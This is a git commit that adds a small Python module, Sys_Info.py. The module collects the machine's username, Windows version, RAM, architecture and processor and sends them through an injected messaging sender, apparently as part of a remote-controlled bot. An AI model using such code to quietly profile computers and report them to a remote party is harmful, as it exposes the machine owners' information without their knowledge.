59a7b845cb3c14b61db43933cded5b295066fc62
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-06 12:16:46 +0300

    Create Sys_Info.py

---
+++ Sys_Info.py
@@ -0,0 +1,17 @@
+from getpass import *
+from psutil import virtual_memory
+from platform import uname , processor , machine
+class Sys_Info():
+	def __init__(self, _):
+		self.Send_Message = _.Send_Message
+		self.Main()
+
+	def Main(self):
+		result = "%F0%9F%96%A5 System Info : \n"
+		result += "%E2%9D%96 Username : " + getuser() + "\n"
+		result += "%E2%9D%96 OS Version : Windows " + uname()[2] + "\n"
+		result += "%E2%9D%96 RAM : " + str(round(virtual_memory().total / (1024.0 **3)))+" GB" + "\n"
+		result += "%E2%9D%96 Bit : " + machine() + "\n"
+		result += "%E2%9D%96 Processor : " + processor()
+		self.Send_Message.Send(result)
+
